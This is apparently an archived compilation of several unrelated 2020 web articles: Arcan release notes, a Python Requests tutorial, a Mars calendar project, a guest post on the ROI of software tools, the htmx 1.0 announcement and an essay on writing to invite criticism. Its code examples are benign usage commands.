<p>As such, it is dedicated to the memory of a fellow explorer and dear friend, Morten, whose insights have been instrumental to the work here and elsewhere. A taste of the depths of such contributions are well illustrated by the <a href="https://www.mamedev.org/?p=477">‘Farewell’ post over at Mamedev.</a> Thanks for everything buddy :'(.</p>



<p>A big thanks to Ryan Gordon (and those who chipped in) for the <a href="https://icculus.org/microgrant2019/">Icculus Microgrant</a>. </p>



<p>Release Time! The following video goes through the demonstrable highlights:</p>

</p></figure>



<p>Here are the shortcuts to some of the key advancements:</p>

<p>If all of this isn’t enough, there is much more in the <a href="https://github.com/letoram/arcan/wiki/Changelog">Changelog</a>.</p>



<h2 id="transparency">Network Transparency</h2>



<p>This release brings us the first working version of ‘arcan-net’. This is an arcan-shmif server that translates clients running locally to another instance across the network. It has been in use for a while, but don’t trust it (yet) in tougher security compartments than you would VNC/RDB.</p>



<p>Not only that, but it is a lot more powerful than the <a href="https://arcan-fe.com/2018/11/16/the-x-network-transparency-myth/">corresponding form in X</a>. It uses a protocol we are lovingly calling ‘A12’ — It is not <em>the</em> X12 some people wanted, but at least it is <em>a</em> twelve. It was also the last missing piece before being able to safely claim to be far beyond feature parity with Xorg,&nbsp;so expect the <a href="https://arcan-fe.com/2018/10/17/arcan-versus-xorg-approaching-feature-parity/">comparison</a> article series to get its next instalment soon enough. With that it is also time to start chasing compatibility (client support) and performance over features.</p>



<p>There is so much ground to cover here that there is a separate article on the subject with more detailed coverage: <a href="https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/">A12 – Advancing Network Transparency on the&nbsp;Desktop</a></p>



<p>Roughly speaking, the features currently cover:</p>



<ul><li>Single Client Forwarding (‘X11’-like), Desktop  Forwarding (‘RFB/RDP/SPICE’-like)</li><li>Remote Input and Meta-data (‘Synergy’- style)</li><li>Audio, Video and Binary Transfers</li><li>Basic blob- caching</li><li>Lossless and Lossy video compression, defaults based on window types</li><li>Interactive adjustment of compression parameters</li><li>X25519 + Chacha8 + Blake3 for authenticated encryption</li><li>Live-client migration</li><li>Multi-threaded processing</li><li>Crude Privilege separation</li></ul>



<p>This meshes really well with other arcan-shmif features, such as the one on external input drivers mentioned below. The video below shows a single nugget from how ‘transparent’ things can be, live migration, drag and drop:</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/_RSvk7mmiSE?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>This is yet another reason as to why ‘<a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/">crash resilience</a>‘ matters – if you solve the one, you get a lot more interesting things in return. </p>



<h2 id="debugging">On-Demand Client Debugging</h2>



<p>When the WM initiates window creation, it can now push windows of a debug type. Should the client cooperate, the first time that happens the client will still get a new window to provide its debug data through. </p>



<p>Should the client fail to comply, or the WM explicitly asks it, a debug interface built into the arcan-shmif library will now silently activate, allowing the horror movie scenario of ‘the call is coming from inside the house’ to unfold.</p>



<p>For better understanding the breadth and depth of the feature, please refer to the following article: <a href="https://arcan-fe.com/2020/02/10/leveraging-the-display-server-to-improve-debugging/">Leveraging the Display Server to Improve Debugging</a></p>



<figure></figure>



<h2 id="kmscon">KMSCon/FBCon like Console</h2>



<p>The default distribution now includes the ‘KMScon- like’ ‘console’ window manager, though it also accepts graphical clients, so if all you need is a “kiosk like” one-application runner per virtual ‘terminal’ (or the template for one), this fits that bill.</p>



<p>The initial form of this was described in the related article on: <a href="https://arcan-fe.com/2018/10/31/walkthrough-writing-a-kmscon-console-like-window-manager-using-arcan/">Writing a console replacement using Arcan</a>.</p>



<p>it has since been extended some, getting support for an OSD keyboard and basic wayland client support as well via the script below. The video below shows it and the keyboard working on a Pinephone:</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/Myn2A4Ek3Rs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>If you have an unrequited love for minimalism confused as simplicity (minimalism doesn’t have room for love, being simply so minimal), this is the tradeoff path that will get you there, eventually.</p>



<h2 id="hooks">Builtins, Hook Script Chaining</h2>



<p>There are multiple facilities for encouraging opt-in code reuse between applications and window managers, both for developers and advanced end users. These are provided in the ‘system-scripts’ namespace and consume the folder names ‘builtin’ and ‘hooks’.  The idea is to let the heavier subprojects like durden act as incubators, and the implementations gets cleaned up and re-usable as such shared builtin scripts.</p>



<p>This time around, the builtins have been extended with:</p>



<ul><li>builtin/decorator.lua – for adding borders and mouse controls for border manipulation to a surface</li><li>builtin/wayland.lua – for adding some of the special considerations that wayland clients require</li><li>builtin/osdkbd.lua – for building custom on-screen display keyboards</li></ul>



<p>This means that the WM side of thing for adding Wayland and XWayland support to a project boils down to about 2/3rds of <a href="https://github.com/letoram/arcan/blob/master/tests/interactive/wltest/wltest.lua">this script</a> that is used for testing. API is stable and supported, has been for a while, will remain as such.</p>



<p>The engine facility for ‘hook scripts’ that are run transparently to the application itself have been improved to allow chaining multiple ones together – greatly improving their utility (actually make them useful).</p>



<p>Previously, these were limited to a single one, which was less than ideal. Now that multiple ones can be chained together, many features that can be implemented in a window manager agnostic way can be shared between all of them.</p>



<p> This is the safer, more secure and much more powerful way to get all the ‘xdotool/xrandr/…’ kind of hacks going without needlessly exposing them over some other IPC.</p>



<p>Some are primarily used for testing, like this auto-shutdown one:</p>



<pre>arcan -H hooks/shutdown.lua durden shutdown=200</pre>



<p>Regardless of the other scripts running, this will issue a shutdown sequence after 200 logical ticks on a 25Hz timer. Since these scripts can simulate and inject other tricky event paths, like display and input hotplug and playback, they are ideal for a window manager testing corpus as the rest of the system can run headless.</p>



<p>Others are more interesting, such as ‘hooks/external_input.lua’ which opens up dedicated single-client connection points that are allowed to inject input, and only that. This is also used to extend the engine with input drivers that would not be allowed into the main engine due to their dependencies or licenses.</p>



<p>This can even be combined with the network proxy mentioned above to allow, for instance, sharing of input devices from other machines (which would enable Synergy- like virtual KMS workflows) and proprietary drivers running inside of containers.</p>



<pre>-- on each desktop participating
arcan -H hooks/external_input.lua durden
ARCAN_CONNPATH=extio_1 arcan-net -t -l 6680

-- remote machine
arcan console
ARCAN_CONNPATH=console ARCAN_ARG=host=10.0.0.1 afsrv_remoting</pre>



<h2 id="eyetrack">Eye Tracking and Stream Decks</h2>



<p>One external driver example is the Tobii 4C eye tracker driver. Even though their hardware is cool, it is still a company that are about as 90ies terrible and backwards with their software ecosystem as can be; shrinkwrap licenses restricting allowed use cases of the sensor data (*facepalm*), closed source drivers, firmware clamped hardware capability and little in terms of serious competition. This is just depressing giving the potential eye tracking actually has outside of vile adtech. There used to be a driver available on their website; it was pulled in a move that can only be assumed to be about further fscking their customers over. A few searches should land you with repositories that mirrored the .debs.</p>



<p>A rough Arcan input driver as part of the repository <a href="https://github.com/letoram/arcan-devices">here</a>, and some docker container to reduce the taint <a href="https://github.com/letoram/arcan-docker">here</a>. Inject the blobs from the driver and experiment with eye tracking inside of Arcan. Other exotic input and LED output clients will also be exposed through that repository rather than the main one.</p>



<p>As covered in the article on ‘<a href="https://arcan-fe.com/2019/10/30/interfacing-with-a-stream-deck-device/">Interfacing with a stream deck device</a>, there is also a support tool for ElGato “streamdeck” like devices added that lets you map window contents, ui controls, custom macros etc. unto the device, though the real meat of this features comes with the next release of <a href="http://durden.arcan-fe.com/">Durden.</a></p>



<p>The following clip is from that feature, recorded in an AirBnB somewhere in Shinjuku:</p>



<figure></figure>



<p>You can see how server-side decorations are being leveraged to map the titlebar contents and controls to the display, mixed with window manager controls like workspace switching with live previews, as well as client-announced custom inputs.</p>



<h2 id="xwayland">XWayland Client Isolation</h2>



<p>We give up. The Wayland protocol service has received support for XWayland clients.</p>



<p>For the last five years or so, the plan was to only support native Wayland clients. After all this time, it turns out that the X11 backends for various …</p></div></div>

<![CDATA[An Introduction to Python's Requests Library]]>

November 27, 2020 | https://www.pythonstacks.com/blog/making-requests-python-requests-library/ | <a href="https://web.archive.org/web/*/https://www.pythonstacks.com/blog/making-requests-python-requests-library/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>HTTP requests run the internet. These HTTP requests are made by devices or browsers(clients) when accessing a webpage.</p>

<p>In python, the Requests library allows us to make HTTP requests in our code and this is very key since many modern applications make use of data from third-party services by the use of APIs.</p>

<p>Python Requests is a great library. It allows you to make GET and POST requests with the options of passing URL parameters, adding headers, posting form data, and more.</p>

<p>With the library, you can make requests to almost every website/webpage, but its power lies in accessing APIs to retrieve data in the form of JSON which you can then work with within your code, applications, and scripts.</p>



<h2>Installing the Requests library</h2>

<p>To install the python Requests library, run the command:</p>

<pre><code>pip install requests</code></pre>

<p>This installs the Requests module and dependencies if any.</p>



<h2>Making a simple request with the Requests module</h2>

<p>Let's try to make a simple request to the python website, https://www.python.org ( you can use any website) :</p>

<pre><code>import requests

r = requests.get("https://www.python.org/")</code></pre>

<p>First, we begin by importing the Requests module. From the Requests module, we use a <code>get() </code>function with our website's URL passed in. With that line of code, a request is made to https://www.python.org and the<span> response is saved into the <code>r </code>variable</span>.</p>

<p>Making a request with the Requests module requires an internet connection.</p>

<p>Now we have a <span>Response object, r</span>. We can retrieve all the information we need from this object.</p>

<p>After a request is made, we get a response from the website's server and we can read the server's response code:</p>

<pre><code>r.status_code    # 200</code></pre>

<p>The status response code of 200 indicates a successful request. You can access the source code of the webpage by:</p>

<pre><code>print(r.text)        # prints webpage's source code</code></pre>

<p>The entire source code of the webpage will be printed in your console. This is useful when doing web scraping.</p>



<h2>Making requests to APIs</h2>

<p>By accessing APIs, we can tap into the full functionality of the Requests module. In this tutorial, we will use an API that returns some fake data from <a href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/posts</a>. The fake data that will be returned represents data of a blog; there are blog posts, users, and comments.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts")

print(r.status_code)    # 200</code></pre>

<p>Now, we have a Response object, r. We can retrieve all the information we need from it.</p>

<h2>Response Content</h2>

<p>We can read the content in various ways by using the <span>attributes and functions provided by the Request module</span>.</p>

<pre><code>r.status_code    # 200

r.encoding       # utf-8

r.url            # https://jsonplaceholder.typicode.com/posts

r.json()           # returns the json data

r.text           # returns the sourcecode

r.content        # returns the reponse body as bytes</code></pre>

<p><code>r.status_code </code>returns a code indicating whether a request was successful or not. 200 means successful. Common status codes that you have probably seen are 200, 404, and 500. 404 means client error and 500 means there was a server error.</p>

<p><code>r.encoding</code> returns the encoding of the response based on the HTTP headers.</p>

<p><code>r.url</code> returns the requested URL.</p>

<p><code>r.json()</code> returns a parsed JSON data from the response.</p>

<p><code>r.text</code> returns response is text format</p>

<p><code>r.content</code> returns the response formated in bytes</p>



<h2>Working with JSON response data</h2>

<p>The JSON data returned from <span>https://jsonplaceholder.typicode.com/posts </span>contains a lot of post data, we are going to need only one post data, therefore we will use this URL <span>https://jsonplaceholder.typicode.com/posts/1 </span>which returns only one post.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

print(r.json())</code></pre>

<p><strong>Output:</strong></p>

<pre><code>{'userId': 1, 'id': 1, 'title': 'sunt aut facere repellat provident occaecati excepturi optio
reprehenderit', 'body': 'quia et suscipit\nsuscipit recusandae consequuntur expedita 
etcum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto'}
</code></pre>

<p>Note that this is just some dummy data representing a post/article with a userId, Id, title, and body.</p>

<p><code>r.json()</code> parses the response into a Python-compatible data type i.e a dictionary or list.</p>



<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

data = r.json()                    # json response is stored in 'data'

post_num = data['id']
user = data['userId']
title = data['title']
body = data['body']

print(f"Post number: {post_num}")
print(f"Written by user: {user}")
print("Title: " + title)
print("---------- Body ----------")                             
print(body)</code></pre>

<p><strong>Output</strong></p>

<pre><code>Post number: 1
Written by user: 1
Title: sunt aut facere repellat provident occaecati excepturi optio reprehenderit
---------- Body ----------
quia et suscipit
suscipit recusandae consequuntur expedita et cum
reprehenderit molestiae ut ut quas totam
nostrum rerum est autem sunt rem eveniet architecto</code></pre>



<h2>Passing URL Parameters</h2>

<p>It is possible to pass parameters in the URL's query string when working with Requests. URL parameters are a common way of passing data, you often see them after the <code>?</code> in a URL. An example is <span>https://www.google.com/search?q=hello</span>&nbsp; this is the URL of google when you search for "hello", therefore the <code>q=hello</code> is the URL parameter.</p>

<p>To pass parameters to the URL, pass the parameters as a dictionary to the <code>params </code>keyword argument. For example; <span>?q=hello</span> will be <span>{'q':'hello'}.</span></p>

<pre><code>import requests

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params={"postId":1})

print(r.url)           # https://jsonplaceholder.typicode.com/comments/?postId=1</code></pre>

<p>You will notice that <code>r.url</code> returns a URL that has automatically appended the parameter to it; <code>?postId=1</code>.</p>



<p><strong>Another Example:</strong></p>

<pre><code>import requests

my_parameters = {"postId":2, "userId":8}

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params=my_parameters)

print(r.url)          # https://jsonplaceholder.typicode.com/comments/?postId=2&amp;userId=8</code></pre>

<p>The keys and values in the <code>my_parameters</code> dictionary,<code> {"postId":2, "userId":8}</code> is converted to <code>?postId=2&amp;userId=8</code> in the final URL.</p>

<![CDATA[A Calendar for Mars in the Browswer]]>

November 27, 2020 | https://danieledep.github.io/whole-mars-calendar/ | <a href="https://web.archive.org/web/*/https://danieledep.github.io/whole-mars-calendar/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info">


  
  
  <p>A dithering playground, a calendar for another planet, a window on the inner solar system, an interactive map, all together. I wanted to learn some front-end libraries but also for curiosity 
    I imagined how a basic tool as the calendar should change on the most hyped planet of the solar system, Mars, where people will have to deal with 
    many hardships and limitations.</p>

    
   
    
  <p>This calendar is similar to ours. A year on Mars has 668 sols, days that span around 24h and 40 minutes, so a martian year roughly doubles our Earth year length, 
    and many people have imagined systems to divide them up. While scientists usually just count the sols from the start of the year and that's it, I think that when you have a continuous settlement it's convenient to have smaller chunks of time for 
    keeping track of repetitive matters. I based the subdivision on the Darian Calendar which divides the Mars Year in 24 months of 28 and 27 sols. The year starts every Vernal equinox, which is
  already the standard for scientists studying the martian seasons. When to count the year Zero from is a debated matter, the Darian Calendar uses 1610, others use 1953 (I did too), I think that when we'll have a continuous human presence it will probably restart from zero anyways.
  </p>

  
  
  <p>
    The martian life will bring heavy constraints to the first settlers: communication, dust storms, oxygen, energy, so to help with the most pressing and time-based of those I added some available information into the calendar. 
    Since any first colony will be still very dependant from Earth, communication with Earth will be super important, but with the distance between the two planets ranging from 100M to 400M kilometers, so the time gap for one-direction communication will vary between 5 and 20 minutes. Just imagine typing a url and wait forty minutes for a response.
    Even more crucial will be the supplies and people coming from Earth, so it will be useful to see in a glance upcoming transfer orbits and in general the positioning of the two planets.  <br>
    In the bottom right box I thought would be useful to have a handy small topographic map of the area of the outpost. Geography is helpful to navigate the rough terrains of Mars, but it also gives insights about one of the most precious resources on Mars: solar light.
    In this interactive map you can drag the marker around the map to see how solar irradiation changes during the seasons and throughout the latitudes.
  </p>
    

    
  

    <p>What started as a small learning project has become something I felt passionate about. I'm actually happy to show it around, 
      but at the same time I feel it could use some polishing (better cartography, better graphics, improved orbit calculations..).
      Also this project could take different shapes, for example I already printed a paper version for my desk!
    I really would like for this project to keep on growing and that would also help me give life to other ideas, so in case you are curious about them too, you can help me make those come true
 by purchasing the pdf version of the next Martian year, which will start on February 2021. </p>

 

 <p>

      It consists of 24 pages one for each month, and in each of them I handpicked the best dithered images I could get. I'm commited to continue to make improvements, 
      so for anybody buying this, I will gift a pdf of the new version when that will be ready. If you are really interested on those paper version of the calendar and the future twists this 
      or other projects will take, please sign up to the mailing list, of course no spammy intentions here.

<p><em>“Should I buy this or not?”</em> Ever since the invention of money (and even before that), this very sensible question accompanies our buying decision. And of course not only for cars, handbags, and trampolines – but also when it comes to buying <strong>software tools</strong>.</p>



<p>I’m no expert when it comes to cars, handbags, and trampolines – but as the CEO and founder of “<a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower</a>” (a desktop GUI for the Git version control system), I have both opinions and some expertise when it comes to SaaS software tools. Of course, my background in a small software company means that I’m highly biased in this matter! But I want to invite you to consider if my <em>arguments</em> might be true, independent of my own bias.</p>



<h2>The ROI of Software Tools is Almost Always Fantastic</h2>



<p>Here is my bold statement: in many cases, <strong>the return on investment is fantastic when it comes to software tools you use for your work</strong>. Let me tell you why I am so convinced that this is true.</p>



<h2>The Benefits of Good Software Tools</h2>



<p>Great software tools come with a host of benefits:</p>



<ol><li><strong>They make you more productive.</strong> For your private purposes, it might be enough if you keep track of tasks you have to do in a simple text file (or even on a piece of paper). But when it comes to your professional work – and especially in a team context – these overly simplistic solutions just won’t cut it. In our team, we are using “<a href="https://www.asana.com/">Asana</a>” to keep track of tasks and projects. And it would be so much harder and cost so much more time if we tried to do this manually! The same logic is true for a tool like “<a href="https://sourcelevel.io/">SourceLevel</a>“: instead of manually pulling together data from various sources, it helps you get a thorough overview of your Pull Request and Code Review metrics quicker and with less effort. <em>Not</em> using these tools – with the intention of trying to save a few bucks – very quickly backfires when it impairs your productivity (and more importantly: the productivity of your whole team)!</li><li><strong>They allow you to do things you couldn’t do without them.</strong> Our own product is a perfect example for this statement: <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower, the Git desktop GUI</a> that we make, helps developers to access advanced features of the Git version control system – which, due to the high complexity and steep learning curve of Git, they wouldn’t be able to use (or wouldn’t even be aware of) without Tower. Many software developers claim to know Git. But when it comes to more advanced features like Interactive Rebase, Submodules, or the Reflog, they either don’t know/ don’t use them – or they simply can’t use them efficiently. Anyone who has ever performed an Interactive Rebase operation, with its many manual steps, quickly comes to love Tower, where the same operation is possible via simple drag and drop!</li><li><strong>They reduce mistakes.</strong> I can vividly remember the stress and the anxiety I used to feel when I had to update our website: I would connect to our live server with an FTP program and replace some files with updated versions. This is the equivalent of open heart surgery, which means that a fair amount of stress is not surprising: there are a lot of things that can go wrong and cause a real mess! This whole scenario, for us, lies many years in the past and looks very different from how we do things today: for our marketing websites, we’re using a service called “<a href="https://deploybot.com/">Deploybot</a>” that makes this process a lot easier. And to run the build process for our main Tower app, we’re using the popular “<a href="https://travis-ci.org/">Travis CI</a>” service. Using both of these services (instead of doing things manually) has greatly reduced our error rate – and thereby saved us lots of hours of putting out fires.</li><li><strong>They free your time for more important work.</strong> As the CEO of a small tech company, my schedule is naturally pretty busy. And as anyone knows who has ever tried to find time on <em>multiple</em> people’s calendars: this is really time consuming work! Offering multiple alternative dates that block your calendar for days, looping in multiple people in multiple time zones, and all the back-and-forth emailing connected with this make these things a true nightmare. This is why I’m happily paying a hundred bucks for a yearly subscription of “<a href="https://calendly.com/">Calendly</a>” In a nutshell, this service allows me to share my availability and leave it to the other party / parties to pick a date and time that’s convenient for them. This completely takes away all of the ugly back-and-forth! And on top of that, it allows the other party to choose very freely and conveniently. This has freed up hours of my time that I can now use for more important work!</li></ol>



<hr>



<p>It’s hard to put a concrete dollar value to the above benefits. But if you think <em>any</em> of them through, you will quickly see that many software tools are a true bargain – they make you more productive, allow you to do things you couldn’t do without them, reduce mistakes, and free your time for more important work. All of this makes for a terribly great return on investment!</p>



<h2>Common Objections</h2>



<p>Let’s not ignore the haters, doubters, and nay-sayers and address some common objections.</p>



<blockquote><p>“It’s too expensive!”</p></blockquote>



<p>Let’s take our own tool, the “Tower” Git GUI, as an example.</p>



<ul><li>A license costs between 69 and 99 USD per user per year.</li><li>Our customers are professional software developers in companies large and small as well as freelance programmers.</li><li>The value that Tower delivers is that it makes software developers more productive: it helps them reduce mistakes and get access to the more advanced features that allow them to produce higher-quality software.</li></ul>



<p>The average software developer’s salary varies wildly, but it’s somewhere between 40,000 and 150,000 USD per year. The math here is very simple: if such a tool can help a developer save just <em>a couple of minutes</em> or prevent <em>just 1-2 errors</em> every month – by adding a meager 69 USD to that 40,000 USD yearly cost – the software tool has already paid for itself!</p>



<p>The same argument holds true for almost <em>any</em> knowledge worker: compared to the salaries of well-educated people, the costs of most software tools are extremely low, almost negligible. This means that they earn back their money very quickly! Either in productivity or any of the other benefits that I mentioned above.</p>



<blockquote><p>“I don’t need a tool for that.”</p></blockquote>



<p>It’s true: you <em>can</em> skin a potato with your bare hands and fingernails. But it’s just not very efficient. One reason why humankind has flourished over the millennia is because we have the ability to invent tools. And a potato peeler isn’t very different from a software tool like Tower: you’ll be more productive and get a better end result when using it!</p>



<p>I don’t doubt that you <em>can</em> do lots of things manually, without using a tool. But think carefully if, at least in some cases, there’s a chance that a tool could make things <em>easier</em> and <em>more productive</em>.</p>



<blockquote><p>“The free alternative is sufficient for me.”</p></blockquote>



<p>While you usually have to <em>pay</em> for a potato peeler, software tools are <em>sometimes</em> free: they might be Open Source, or a programmer’s hobby project, or they’re sponsored by a large corporation.</p>



<p>In some cases, such a free piece of software might indeed be an excellent choice (very often the case with Open Source projects). But more often than not, “free” will come with a price tag. Let’s take <strong>quality</strong> as an example: often, quality is not on par with paid alternatives. Why? Because quality costs an immense amount of time and money which both have to come from somewhere! Other examples are non-existent customer support or the lack of good documentation. All of these things, just like the overall “quality” aspect, cost time and money which are often not available in the case of free software.</p>



<blockquote><p>“My boss won’t pay for this.”</p></blockquote>



<p>Dear managers: I hope that reading this far has convinced you that it makes a ton of sense to cover expenses for software tools. If they make your employees just a tiny bit more productive – or if they make their lives a little bit easier – then covering expenses for tools should be a no-brainer. After all, <strong>our job as managers is to provide the people in our teams with everything they need to do good, productive work</strong>.</p>



<h2>A Look at Our Own “Household Spending”</h2>



<p>I started this post by admitting that I’m terribly biased: as CEO of a small software company, it’s probably no surprise that I encourage people to buy <em>our</em> software. However, I’m quite confident that I went beyond <em>our own</em> product and proved that the ROI of software tools <em>in general</em> is often very good.</p>



<p>To prove that we really “walk the walk” (and not just “talk the talk”), here’s an overview of the tools that we spend our own, hard-earned money on:</p>



<figure><img loading="lazy" width="686" height="1024" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png" alt="" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png 686w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-201x300.png 201w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-768x1146.png 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools.png 842w" sizes="(max-width: 686px) 100vw, 686px"><figcaption>Software Tools Overtable</figcaption></figure>



<h2>It Goes Without Saying: Spend Wisely!</h2>



<p>Of course, all of the above does NOT mean that you should just spend, spend, spend! 💵 Like in other areas of life, you shouldn’t give in to every impulse and just buy any software tool that you come across.</p>



<p>But when it comes to <em>tools for your work</em>, I encourage you to keep your eyes just as much on the “return” part as on the “investment” of the “Return on Investment” consideration. <strong>Don’t hesitate to buy software that brings value!</strong> If it helps you and your team do your jobs better – in a more productive, easier, or safer way – then investing is probably much more clever than being overly frugal.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.0.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.0.0/">1.0.0 release</a> of htmx.</p>
<p>htmx is now mature enough that I can recommend it as a general replacement for intercooler.js
projects.  I <strong>don't</strong> think there is a strong reason to port an existing intercooler project to
htmx.  I have several large intercooler apps and will not be moving them over any time soon. I can, however, recommend using htmx over intercooler for new projects.</p>
<p>htmx is a different sort of javascript library.  It is an HTML &amp; hypertext-oriented reply to the current dominance of javascript-based SPA libraries.  It is a response to Tom MacWright's question:
<a href="https://macwright.com/2020/10/28/if-not-spas.html">"If not SPAs, What?"</a>.</p>
<p>As the <a href="https://htmx.org/">homepage says</a>:</p>
<ul>
<li>Why should only <code>&lt;a&gt;</code> and <code>&lt;form&gt;</code> be able to make HTTP requests?</li>
<li>Why should only <code>click</code> &amp; <code>submit</code> events trigger them?</li>
<li>Why should only GET &amp; POST be available?</li>
<li>Why should you only be able to replace the entire screen?</li>
</ul>
<p>HTML-oriented web development was abandoned not because hypertext was a bad idea, but rather because HTML didn't have sufficient expressive power.  htmx aims to fix that &amp; allows you to implement <a href="https://htmx.org/examples/">many common modern web UI patterns</a> using the original hypertext model of the web.</p>
<h3>History &amp; Thanks</h3>
<p>htmx began life as <a href="https://intercoolerjs.org/">intercooler.js</a> back in <a href="https://github.com/bigskysoftware/intercooler-js/commit/62d3dbdb5c056ee866aba3575e148de649fc3efe">2013</a>.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/commit/e38dea64dd1065003a0e833d7b469d24e6bc2919">april</a> of this year I began work on a jQuery-indepenent &amp; improved version of intercoolerjs, renamed
to htmx.  I chose to rename the library because, in working on intercooler, I had come to appreciate that intercooler &amp; htmx were completing HTML as a hypertext rather than just some funky, idiosyncratic javascript libraries.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/releases/tag/v0.0.1">May</a> htmx reached 0.0.1.  Soon thereafter I had the good fortune of being contacted by <a href="https://twitter.com/ben_pylo">Ben Croker</a>
who was interested in htmx as a base for his new reactive library, <a href="https://putyourlightson.com/plugins/sprig">Sprig</a>.  Ben was willing to be an early adopter of htmx and pushed the library along
much faster than it would have gone otherwise.</p>
<p>I have been very lucky to the have help and feedback from many contributors in <a href="https://github.com/bigskysoftware/htmx/graphs/contributors">Github</a> and on <a href="https://htmx.org/discord">Discord</a>.  I'd like to thank, in particular, <a href="https://github.com/benpate">Ben Pate</a>, <a href="https://github.com/rschroll">Robert Schroll</a> &amp; <a href="https://github.com/jreviews">Alejandro Schmeichler</a> for contributing code as well as new ideas and discussions.</p>
<p>I would like to thank <a href="https://devmode.fm/">Devmode.fm</a> for having me on to <a href="https://devmode.fm/episodes/dynamic-html-with-htmx">talk about htmx</a> and for cleaning up all my "uhhs" and "umms".</p>
<p>Finally, I would like to thank <a href="https://github.com/jsampson">Justin Sampson</a>, who took a lot of time to explain REST &amp; HATEOAS to me and how intercooler (and now htmx) fit into that model for web development.</p>
<h3>Changes</h3>
<ul>
<li>I bumped the version number :)</li>
</ul>
<p>Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <h2 id="i">I</h2><p>I, like many other people, have discovered that it is almost impossible to think seriously without writing. Writing clarifies and sharpens your thoughts in a way that is superior to merely articulating them in a conversation. It allows you to look at your ideas more objectively, almost as if they were from another person. You can then examine them and think about if what you have written down is really true.</p><p>However, more often than discovering that your ideas are wrong, you will discover something different: that you do not know what you think. Sure, you have some vague idea, and you believe that there is a chain of reasoning that leads to a certain conclusion. But what you will discover is that this chain of reasoning is mostly not existent. At best, it has many holes and maybe leads not where you think it does. This discovery is, of course, very unpleasant and sometimes even painful. In a sense, you have lied to yourself by thinking you have thought through this specific topic when, in reality, you have only copied the opinion of someone else.</p><p>This process requires an immense amount of honesty because nobody likes to feel stupid. Either you do not know what you think, in which case you feel stupid. Or it turns out that what you believed to be your opinion does not really make sense, is logically inconsistent, and mostly copied from someone else, in which case you feel stupid as well. However, the reward for all this exhausting work is clarity and simplicity. You now possess a chain of reasoning where you have looked as carefully as you can for holes and problems. The next step is to let others examine your reasoning—publishing.</p><h2 id="ii">II</h2><p>I am happy when others enjoy my work and when I can offer a new perspective, but for me, the criticism of my ideas is the most rewarding part of publishing. This is why I recently wrote:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Don't write to criticize others; write to be criticized by others.</p>— Sven Schnieders (@SvenSchnieders) <a href="https://twitter.com/SvenSchnieders/status/1303074445003812864?ref_src=twsrc%5Etfw">September 7, 2020</a></blockquote>

</figure><p>If you care about being less wrong tomorrow than you are today, you have to take this extreme attitude towards criticism. It will show in your writings and in the way you express your ideas. If you want to be perceived as smart and right, you will articulate your ideas in a moderate way so that others agree with it. (This is one of the main problems I have with contemporary intellectuals who always seem to take the middle ground.) If you are searching for truth, you will articulate the most extreme and radical consequences of your ideas, precisely because others will disagree with them and tell you where your ideas are wrong.</p><p>A good example is a discussion about the distribution of intelligence (not IQ) that I often have with my dad. To crudely summarize the discussion: he believes most people are too stupid to understand complex ideas; for him, this even applies to people who do not recognize the importance of free speech (the real free speech without the “but”). On the other hand, I think that the difference between people’s minds is mostly quantitative (speed and memory) and that almost everyone can understand complex ideas if they take the time and put in the effort; for me, this even applies to, e.g., quantum mechanics.</p><p>I do not want to get into the discussion (that’s a different essay, and it is more nuanced than I portrayed it here), but note how radically different our positions are. It is because we both put forward the most extreme consequence of our theories. If he or I cared about finding a consensus and about looking correct, we could have used different examples: he could have said that people cannot understand complex systems like capitalism, and I could have said that people are capable of understanding even classical physics.</p><p>Notice that the disagreement looks way less severe using these examples. Some people might even argue that understanding how capitalism works is more difficult than understanding classical physics. It feels as if we are way closer to a compromise or to finding a common ground. But in reality, were are just further away from finding the truth because our disagreement is not as clear and obvious as it could be, which leads to worse criticism.</p><h2 id="iii">III</h2><p>This way of expressing ideas can sometimes be perceived as rude because, in contrast to most other people, you are not searching for consensus but for the truth. However, it is not a form of arrogance to express the most extreme consequences of your ideas; it is a form of intellectual honesty. In this way, your ideas are widely open to criticism, and you are therefore more likely to 